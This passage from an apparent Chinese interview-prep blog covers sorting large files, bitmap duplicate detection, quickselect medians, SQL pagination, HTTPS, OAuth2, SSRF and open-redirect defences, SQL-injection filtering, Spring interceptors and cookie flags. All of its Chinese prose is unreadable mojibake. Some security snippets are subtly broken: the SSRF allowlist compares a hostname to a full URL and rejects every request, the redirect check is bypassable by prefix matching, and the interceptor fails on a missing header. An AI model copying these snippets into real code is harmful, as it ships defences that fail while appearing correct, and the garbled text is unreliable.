TimeUnit.MINUTES);</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>å¹‚ç­‰æ¥å£è®¾è®¡</strong>ï¼š<ul><li><code>PUT</code> è¯·æ±‚åº”æ›´æ–°èµ„æºï¼Œè€Œéåˆ›å»ºæ–°èµ„æºã€‚</li></ul></li></ol><hr><h3 id="å¤§æ–‡ä»¶å°å†…å­˜çš„æ’åºå¦‚ä½•åšï¼Ÿ"><a href="#å¤§æ–‡ä»¶å°å†…å­˜çš„æ’åºå¦‚ä½•åšï¼Ÿ" class="headerlink" title="å¤§æ–‡ä»¶å°å†…å­˜çš„æ’åºå¦‚ä½•åšï¼Ÿ"></a><strong>å¤§æ–‡ä»¶å°å†…å­˜çš„æ’åºå¦‚ä½•åšï¼Ÿ</strong></h3><p><strong>å¤–éƒ¨æ’åºï¼ˆExternal Sortingï¼‰</strong>ï¼š</p><ol><li><strong>åˆ†å—æ’åº</strong>ï¼š<ul><li>å°†å¤§æ–‡ä»¶æ‹†åˆ†æˆå¤šä¸ªå°æ–‡ä»¶ï¼ˆæ¯ä¸ªå¯æ”¾å…¥å†…å­˜ï¼‰ã€‚</li><li>ä½¿ç”¨ <code>å¿«é€Ÿæ’åº</code> æˆ– <code>å½’å¹¶æ’åº</code> å¯¹å°æ–‡ä»¶æ’åºã€‚</li></ul></li><li><strong>å¤šè·¯å½’å¹¶ï¼ˆK-Way Mergeï¼‰</strong>ï¼š<ul><li>å½’å¹¶æ’åºåçš„å°æ–‡ä»¶ï¼Œåˆ©ç”¨ <strong>æœ€å°å †</strong> è¿›è¡Œåˆå¹¶ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sorted_part1.txt&quot;</span>) <span class="keyword">as</span> f1, <span class="built_in">open</span>(<span class="string">&quot;sorted_part2.txt&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    merged = heapq.merge(f1, f2)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;final_sorted.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> merged:</span><br><span class="line">            out.write(line)</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>é€‚ç”¨ç®—æ³•</strong>ï¼š</p><ul><li><strong>å½’å¹¶æ’åºï¼ˆMerge Sortï¼‰</strong>ï¼Œé€‚åˆå¤§æ–‡ä»¶åˆ†å—å¤„ç†ã€‚</li><li><strong>åŸºæ•°æ’åºï¼ˆRadix Sortï¼‰</strong>ï¼Œé€‚åˆæ•´æ•°æ’åºã€‚</li></ul><hr><h3 id="æœ‰-1-äº¿ä¸ªæ•°å­—ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªæ˜¯é‡å¤çš„ï¼Œå¦‚ä½•å¿«é€Ÿæ‰¾åˆ°ï¼Ÿè¦æ±‚æ—¶é—´å’Œç©ºé—´æœ€ä¼˜ã€‚"><a href="#æœ‰-1-äº¿ä¸ªæ•°å­—ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªæ˜¯é‡å¤çš„ï¼Œå¦‚ä½•å¿«é€Ÿæ‰¾åˆ°ï¼Ÿè¦æ±‚æ—¶é—´å’Œç©ºé—´æœ€ä¼˜ã€‚" class="headerlink" title="æœ‰ 1 äº¿ä¸ªæ•°å­—ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªæ˜¯é‡å¤çš„ï¼Œå¦‚ä½•å¿«é€Ÿæ‰¾åˆ°ï¼Ÿè¦æ±‚æ—¶é—´å’Œç©ºé—´æœ€ä¼˜ã€‚"></a><strong>æœ‰ 1 äº¿ä¸ªæ•°å­—ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªæ˜¯é‡å¤çš„ï¼Œå¦‚ä½•å¿«é€Ÿæ‰¾åˆ°ï¼Ÿè¦æ±‚æ—¶é—´å’Œç©ºé—´æœ€ä¼˜ã€‚</strong></h3><p><strong>è§£æ³• 1ï¼šä½å›¾æ³•ï¼ˆBitMapï¼‰</strong>ï¼ˆç©ºé—´ O(N&#x2F;8)ï¼Œæ—¶é—´ O(N)ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bit_array = [<span class="number">0</span>] * (<span class="number">10</span>**<span class="number">8</span> // <span class="number">8</span>)  <span class="comment"># æ¯ä¸ª bit ä»£è¡¨ä¸€ä¸ªæ•°</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">    index, offset = <span class="built_in">divmod</span>(num, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> (bit_array[index] &gt;&gt; offset) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é‡å¤æ•°å­—:&quot;</span>, num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bit_array[index] |= (<span class="number">1</span> &lt;&lt; offset)</span><br></pre></td></tr></table></figure><p><strong>è§£æ³• 2ï¼šå“ˆå¸Œé›†åˆ</strong>ï¼ˆç©ºé—´ O(N)ï¼Œæ—¶é—´ O(N)ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seen = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">in</span> seen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é‡å¤æ•°å­—:&quot;</span>, num)</span><br><span class="line">    seen.add(num)</span><br></pre></td></tr></table></figure><p><strong>è§£æ³• 3ï¼šæ’åº + ç›¸é‚»æ¯”è¾ƒ</strong>ï¼ˆç©ºé—´ O(1)ï¼Œæ—¶é—´ O(N log N)ï¼‰</p><ul><li>ä½¿ç”¨å¤–éƒ¨æ’åºï¼ˆå½’å¹¶&#x2F;å¿«é€Ÿæ’åºï¼‰ï¼Œç„¶åéå†æ‰¾ç›¸åŒæ•°å­—ã€‚</li></ul><hr><h3 id="1-äº¿ä¸ªéšæœºç”Ÿæˆçš„æ— åºæ•´æ•°ï¼Œæ‰¾å‡ºä¸­é—´å¤§å°çš„å€¼ã€‚"><a href="#1-äº¿ä¸ªéšæœºç”Ÿæˆçš„æ— åºæ•´æ•°ï¼Œæ‰¾å‡ºä¸­é—´å¤§å°çš„å€¼ã€‚" class="headerlink" title="1 äº¿ä¸ªéšæœºç”Ÿæˆçš„æ— åºæ•´æ•°ï¼Œæ‰¾å‡ºä¸­é—´å¤§å°çš„å€¼ã€‚"></a><strong>1 äº¿ä¸ªéšæœºç”Ÿæˆçš„æ— åºæ•´æ•°ï¼Œæ‰¾å‡ºä¸­é—´å¤§å°çš„å€¼ã€‚</strong></h3><p><strong>è§£æ³• 1ï¼šå¿«é€Ÿé€‰æ‹©ï¼ˆQuickSelectï¼ŒO(N)ï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">arr, left, right</span>):</span><br><span class="line">    pivot = arr[right]</span><br><span class="line">    i = left</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(left, right):</span><br><span class="line">        <span class="keyword">if</span> arr[j] &lt; pivot:</span><br><span class="line">            arr[i], arr[j] = arr[j], arr[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    arr[i], arr[right] = arr[right], arr[i]</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quick_select</span>(<span class="params">arr, k</span>):</span><br><span class="line">    left, right = <span class="number">0</span>, <span class="built_in">len</span>(arr) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">        pivot_index = partition(arr, left, right)</span><br><span class="line">        <span class="keyword">if</span> pivot_index == k:</span><br><span class="line">            <span class="keyword">return</span> arr[pivot_index]</span><br><span class="line">        <span class="keyword">elif</span> pivot_index &lt; k:</span><br><span class="line">            left = pivot_index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = pivot_index - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">numbers = [random.randint(<span class="number">0</span>, <span class="number">10</span>**<span class="number">9</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">8</span>)]</span><br><span class="line">median = quick_select(numbers, <span class="built_in">len</span>(numbers) // <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(median)</span><br></pre></td></tr></table></figure><p><strong>è§£æ³• 2ï¼šæœ€å°å †ï¼ˆO(N log K)ï¼‰</strong></p><ul><li>ç»´æŠ¤ä¸€ä¸ª <strong>å¤§å°ä¸º N&#x2F;2+1 çš„æœ€å°å †</strong>ï¼Œå †é¡¶å³ä¸ºä¸­ä½æ•°ã€‚</li></ul><hr><h3 id="è°ƒè¯•å·¥å…·åŠå¼‚å¸¸æ’æŸ¥æµç¨‹ï¼Ÿ"><a href="#è°ƒè¯•å·¥å…·åŠå¼‚å¸¸æ’æŸ¥æµç¨‹ï¼Ÿ" class="headerlink" title="è°ƒè¯•å·¥å…·åŠå¼‚å¸¸æ’æŸ¥æµç¨‹ï¼Ÿ"></a><strong>è°ƒè¯•å·¥å…·åŠå¼‚å¸¸æ’æŸ¥æµç¨‹ï¼Ÿ</strong></h3><p><strong>å¸¸è§è°ƒè¯•å·¥å…·</strong>ï¼š</p><ul><li>**<code>top</code> &#x2F; <code>htop</code>**ï¼ˆCPUã€å†…å­˜ä½¿ç”¨ï¼‰</li><li>**<code>strace</code>**ï¼ˆç³»ç»Ÿè°ƒç”¨è·Ÿè¸ªï¼‰</li><li>**<code>gdb</code>**ï¼ˆC&#x2F;C++ è°ƒè¯•ï¼‰</li><li>**<code>jstack</code>**ï¼ˆJava çº¿ç¨‹å †æ ˆï¼‰</li></ul><p><strong>å¼‚å¸¸æ’æŸ¥æµç¨‹</strong>ï¼š</p><ol><li><strong>æ—¥å¿—åˆ†æ</strong>ï¼ˆ<code>tail -f logs/app.log</code>ï¼‰</li><li><strong>æ£€æŸ¥èµ„æºå ç”¨</strong>ï¼ˆ<code>top</code>ã€<code>ps aux</code>ï¼‰</li><li><strong>ç½‘ç»œè¿é€šæ€§</strong>ï¼ˆ<code>ping</code>ã€<code>telnet</code>ï¼‰</li><li><strong>ä»£ç çº§ Debugï¼ˆgdbã€pdbï¼‰</strong></li></ol><hr><h3 id="æ•°æ®åº“ç´¢å¼•ç»“æ„ï¼Œä»€ä¹ˆæƒ…å†µä¸‹åº”è¯¥å»ºå”¯ä¸€ç´¢å¼•ï¼Ÿ"><a href="#æ•°æ®åº“ç´¢å¼•ç»“æ„ï¼Œä»€ä¹ˆæƒ…å†µä¸‹åº”è¯¥å»ºå”¯ä¸€ç´¢å¼•ï¼Ÿ" class="headerlink" title="æ•°æ®åº“ç´¢å¼•ç»“æ„ï¼Œä»€ä¹ˆæƒ…å†µä¸‹åº”è¯¥å»ºå”¯ä¸€ç´¢å¼•ï¼Ÿ"></a><strong>æ•°æ®åº“ç´¢å¼•ç»“æ„ï¼Œä»€ä¹ˆæƒ…å†µä¸‹åº”è¯¥å»ºå”¯ä¸€ç´¢å¼•ï¼Ÿ</strong></h3><table><thead><tr><th><strong>ç´¢å¼•ç±»å‹</strong></th><th><strong>é€‚ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td><strong>å”¯ä¸€ç´¢å¼•ï¼ˆUnique Indexï¼‰</strong></td><td>é˜²æ­¢é‡å¤æ•°æ®ï¼Œå¦‚ <code>ç”¨æˆ·å</code>ã€<code>é‚®ç®±</code></td></tr><tr><td><strong>æ™®é€šç´¢å¼•ï¼ˆIndexï¼‰</strong></td><td>åŠ é€ŸæŸ¥è¯¢ï¼Œå¦‚ <code>WHERE status=1</code></td></tr><tr><td><strong>å¤åˆç´¢å¼•ï¼ˆComposite Indexï¼‰</strong></td><td>å¤šæ¡ä»¶æŸ¥è¯¢ï¼Œå¦‚ <code>(user_id, order_date)</code></td></tr></tbody></table><p><strong>å”¯ä¸€ç´¢å¼•ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX idx_email <span class="keyword">ON</span> users(email);</span><br></pre></td></tr></table></figure><hr><h3 id="æ•°æ®åº“åˆ†é¡µè¯­å¥å¦‚ä½•å†™ï¼Ÿ"><a href="#æ•°æ®åº“åˆ†é¡µè¯­å¥å¦‚ä½•å†™ï¼Ÿ" class="headerlink" title="æ•°æ®åº“åˆ†é¡µè¯­å¥å¦‚ä½•å†™ï¼Ÿ"></a><strong>æ•°æ®åº“åˆ†é¡µè¯­å¥å¦‚ä½•å†™ï¼Ÿ</strong></h3><h2 id="MySQL-åˆ†é¡µæŸ¥è¯¢ï¼šä¼˜åŒ–æ–¹å¼ï¼š1-ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼š-2-é¿å…-OFFSET-æ‰«æï¼ˆé€‚ç”¨äºå¤§æ•°æ®é‡ï¼‰ï¼š"><a href="#MySQL-åˆ†é¡µæŸ¥è¯¢ï¼šä¼˜åŒ–æ–¹å¼ï¼š1-ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼š-2-é¿å…-OFFSET-æ‰«æï¼ˆé€‚ç”¨äºå¤§æ•°æ®é‡ï¼‰ï¼š" class="headerlink" title="MySQL åˆ†é¡µæŸ¥è¯¢ï¼šä¼˜åŒ–æ–¹å¼ï¼š1. ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼š   2. é¿å… OFFSET æ‰«æï¼ˆé€‚ç”¨äºå¤§æ•°æ®é‡ï¼‰ï¼š   "></a><strong>MySQL åˆ†é¡µæŸ¥è¯¢</strong>ï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span> <span class="keyword">OFFSET</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure><br><strong>ä¼˜åŒ–æ–¹å¼</strong>ï¼š<br>1. <strong>ä½¿ç”¨è¦†ç›–ç´¢å¼•</strong>ï¼š<br>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> status<span class="operator">=</span><span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span> <span class="keyword">OFFSET</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure><br>2. <strong>é¿å… <code>OFFSET</code> æ‰«æ</strong>ï¼ˆé€‚ç”¨äºå¤§æ•°æ®é‡ï¼‰ï¼š<br>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">1000</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span>;</span><br></pre></td></tr></table></figure></h2><h3 id="HTTPS-äº¤äº’è¿‡ç¨‹"><a href="#HTTPS-äº¤äº’è¿‡ç¨‹" class="headerlink" title="HTTPS äº¤äº’è¿‡ç¨‹"></a><strong>HTTPS äº¤äº’è¿‡ç¨‹</strong></h3><ol><li><strong>å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚</strong>ï¼š<ul><li>æµè§ˆå™¨è®¿é—® <code>https://example.com</code>ï¼Œè¯·æ±‚æœåŠ¡å™¨çš„ <strong>TLS è¯ä¹¦</strong>ã€‚</li></ul></li><li><strong>æœåŠ¡å™¨è¿”å› SSL è¯ä¹¦</strong>ï¼š<ul><li>æœåŠ¡å™¨æä¾› <strong>å…¬é’¥è¯ä¹¦ï¼ˆCA ç­¾å‘ï¼‰</strong>ã€‚</li></ul></li><li><strong>å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦</strong>ï¼š<ul><li>æ£€æŸ¥ <strong>æ˜¯å¦è¢«ä¿¡ä»»</strong>ï¼Œè¯ä¹¦æ˜¯å¦ <strong>è¿‡æœŸ&#x2F;åŠé”€</strong>ã€‚</li></ul></li><li><strong>å¯†é’¥åå•†</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>Diffie-Hellman &#x2F; RSA</strong> ç”Ÿæˆå¯¹ç§°å¯†é’¥ã€‚</li></ul></li><li><strong>åŠ å¯†æ•°æ®ä¼ è¾“</strong>ï¼š<ul><li>å®¢æˆ·ç«¯ä½¿ç”¨å¯¹ç§°å¯†é’¥è¿›è¡ŒåŠ å¯†é€šä¿¡ã€‚</li></ul></li></ol><hr><h3 id="OAuth2-0-äº¤äº’è¿‡ç¨‹åŠä¸å½“å®‰å…¨é£é™©"><a href="#OAuth2-0-äº¤äº’è¿‡ç¨‹åŠä¸å½“å®‰å…¨é£é™©" class="headerlink" title="OAuth2.0 äº¤äº’è¿‡ç¨‹åŠä¸å½“å®‰å…¨é£é™©"></a><strong>OAuth2.0 äº¤äº’è¿‡ç¨‹åŠä¸å½“å®‰å…¨é£é™©</strong></h3><p><strong>OAuth2.0 æˆæƒæµç¨‹</strong>ï¼š</p><ol><li>ç”¨æˆ·è®¿é—® <strong>Clientï¼ˆç¬¬ä¸‰æ–¹åº”ç”¨ï¼‰</strong> å¹¶è¯·æ±‚æˆæƒã€‚</li><li>Client è·³è½¬åˆ° <strong>OAuth æœåŠ¡å™¨</strong> è·å–æˆæƒç ï¼ˆ<code>Authorization Code</code>ï¼‰ã€‚</li><li>OAuth æœåŠ¡å™¨é‡å®šå‘å› Client å¹¶æºå¸¦æˆæƒç ã€‚</li><li>Client ç”¨æˆæƒç æ¢å– <strong>Access Token</strong>ã€‚</li><li>Client ä½¿ç”¨ <code>Access Token</code> è®¿é—®å—ä¿æŠ¤èµ„æºã€‚</li></ol><p><strong>å®‰å…¨é£é™©</strong>ï¼š</p><ul><li><strong>Token æ³„éœ²</strong>ï¼š<ul><li>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨ <strong>çŸ­æœŸ Token + Refresh Token</strong>ã€‚</li></ul></li><li><strong>é‡æ”¾æ”»å‡»</strong>ï¼š<ul><li>è§£å†³æ–¹æ¡ˆï¼šç»‘å®š <code>PKCEï¼ˆCode Verifierï¼‰</code>ã€‚</li></ul></li><li><strong>æ¶æ„ Client æ»¥ç”¨ Token</strong>ï¼š<ul><li>è§£å†³æ–¹æ¡ˆï¼šä¸¥æ ¼éªŒè¯ <code>redirect_uri</code>ï¼Œåªå…è®¸ç™½åå•åŸŸåã€‚</li></ul></li></ul><hr><h3 id="è·å–-URL-å†…å®¹æ—¶çš„å®‰å…¨æ³¨æ„äº‹é¡¹"><a href="#è·å–-URL-å†…å®¹æ—¶çš„å®‰å…¨æ³¨æ„äº‹é¡¹" class="headerlink" title="è·å– URL å†…å®¹æ—¶çš„å®‰å…¨æ³¨æ„äº‹é¡¹"></a><strong>è·å– URL å†…å®¹æ—¶çš„å®‰å…¨æ³¨æ„äº‹é¡¹</strong></h3><p><strong>é˜²å¾¡æªæ–½</strong>ï¼š</p><ol><li><strong>é˜²æ­¢ SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰</strong>ï¼š<ul><li>ä»…å…è®¸ç™½åå• URLï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allowed_hosts = [<span class="string">&quot;https://trusted.com&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> urlparse(user_input_url).netloc <span class="keyword">not</span> <span class="keyword">in</span> allowed_hosts:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;éæ³•è¯·æ±‚&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>é˜²æ­¢ Open Redirect</strong>ï¼š<ul><li>ç¦æ­¢ <code>http://attacker.com</code> ä¼ªè£…æˆ <code>example.com</code>ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;https://trusted.com&quot;</span>):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;éæ³• URL&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(user_input_url, timeout=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="å‚æ•°å…¥åº“å‰å¦‚ä½•è¿‡æ»¤ï¼Ÿ"><a href="#å‚æ•°å…¥åº“å‰å¦‚ä½•è¿‡æ»¤ï¼Ÿ" class="headerlink" title="å‚æ•°å…¥åº“å‰å¦‚ä½•è¿‡æ»¤ï¼Ÿ"></a><strong>å‚æ•°å…¥åº“å‰å¦‚ä½•è¿‡æ»¤ï¼Ÿ</strong></h3><p><strong>é¢„é˜² SQL æ³¨å…¥çš„æªæ–½</strong>ï¼š</p><ol><li><strong>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢</strong>ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE id = %s&quot;</span>, (user_input,))</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ ORM æ¡†æ¶</strong>ï¼š<ul><li>é¿å…ç›´æ¥æ‹¼æ¥ SQLï¼Œä½¿ç”¨ <code>SQLAlchemy</code>ã€<code>Django ORM</code>ã€‚</li></ul></li><li><strong>æ­£åˆ™æ ¡éªŒ</strong>ï¼š<ul><li>ä»…å…è®¸æ•°å­—ã€å­—æ¯ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[a-zA-Z0-9]+$&quot;</span>, user_input):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;éæ³•è¾“å…¥&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="è¿‡æ»¤å™¨å’Œæ‹¦æˆªå™¨åŸç†å’Œåº”ç”¨åœºæ™¯ï¼Ÿ"><a href="#è¿‡æ»¤å™¨å’Œæ‹¦æˆªå™¨åŸç†å’Œåº”ç”¨åœºæ™¯ï¼Ÿ" class="headerlink" title="è¿‡æ»¤å™¨å’Œæ‹¦æˆªå™¨åŸç†å’Œåº”ç”¨åœºæ™¯ï¼Ÿ"></a><strong>è¿‡æ»¤å™¨å’Œæ‹¦æˆªå™¨åŸç†å’Œåº”ç”¨åœºæ™¯ï¼Ÿ</strong></h3><table><thead><tr><th><strong>æ¦‚å¿µ</strong></th><th><strong>ä½œç”¨</strong></th><th><strong>åº”ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td><strong>è¿‡æ»¤å™¨ï¼ˆFilterï¼‰</strong></td><td>å¤„ç† <strong>è¯·æ±‚&#x2F;å“åº”</strong></td><td>è®¤è¯ã€æ—¥å¿—è®°å½•</td></tr><tr><td><strong>æ‹¦æˆªå™¨ï¼ˆInterceptorï¼‰</strong></td><td>æ§åˆ¶ <strong>æ–¹æ³•è°ƒç”¨</strong></td><td>AOPï¼ˆåˆ‡é¢ç¼–ç¨‹ï¼‰ã€æƒé™æ ¡éªŒ</td></tr></tbody></table><p><strong>ç¤ºä¾‹ï¼šSpring æ‹¦æˆªå™¨</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!request.getHeader(<span class="string">&quot;Authorization&quot;</span>).startsWith(<span class="string">&quot;Bearer&quot;</span>)) &#123;</span><br><span class="line">            response.setStatus(<span class="number">403</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="SESSION-å’Œ-Cookie-çš„åŒºåˆ«"><a href="#SESSION-å’Œ-Cookie-çš„åŒºåˆ«" class="headerlink" title="SESSION å’Œ Cookie çš„åŒºåˆ«"></a><strong>SESSION å’Œ Cookie çš„åŒºåˆ«</strong></h3><table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><strong>SESSION</strong></th><th><strong>Cookie</strong></th></tr></thead><tbody><tr><td><strong>å­˜å‚¨ä½ç½®</strong></td><td>æœåŠ¡å™¨</td><td>å®¢æˆ·ç«¯</td></tr><tr><td><strong>ç”Ÿå‘½å‘¨æœŸ</strong></td><td>ä¼šè¯ç»“æŸ</td><td>å¯è®¾å®šè¿‡æœŸæ—¶é—´</td></tr><tr><td><strong>å®‰å…¨æ€§</strong></td><td>é«˜ï¼Œå­˜å‚¨åœ¨æœåŠ¡å™¨</td><td>æ˜“è¢«çªƒå–</td></tr></tbody></table><p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p><ul><li><strong>SESSION</strong> é€‚ç”¨äº <strong>çŸ­æœŸä¼šè¯ï¼ˆå¦‚ç™»å½•ï¼‰</strong>ã€‚</li><li><strong>COOKIE</strong> é€‚ç”¨äº <strong>é•¿æœŸæ ‡è¯†ç”¨æˆ·ï¼ˆå¦‚è‡ªåŠ¨ç™»å½•ï¼‰</strong>ã€‚</li></ul><hr><h3 id="SESSION-ID-å¦‚ä½•ä¸è¢«-JavaScript-è¯»å–ï¼Ÿ"><a href="#SESSION-ID-å¦‚ä½•ä¸è¢«-JavaScript-è¯»å–ï¼Ÿ" class="headerlink" title="SESSION ID å¦‚ä½•ä¸è¢« JavaScript è¯»å–ï¼Ÿ"></a><strong>SESSION ID å¦‚ä½•ä¸è¢« JavaScript è¯»å–ï¼Ÿ</strong></h3><p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p><ol><li><strong>è®¾ç½® <code>HttpOnly</code></strong><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=xyz123; HttpOnly</span><br></pre></td></tr></table></figure><ul><li>é˜²æ­¢ JavaScript é€šè¿‡ <code>document.cookie</code> è®¿é—® <code>SESSION ID</code>ã€‚</li></ul></li><li><strong>ä½¿ç”¨ <code>SameSite=Strict</code></strong> é˜²å¾¡ CSRFï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=xyz123; SameSite=Strict</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="CSRF-Token-å¦‚ä½•è®¾è®¡ï¼Ÿ"><a href="#CSRF-Token-å¦‚ä½•è®¾è®¡ï¼Ÿ" class="headerlink" title="CSRF Token å¦‚ä½•è®¾è®¡ï¼Ÿ"></a><strong>CSRF Token 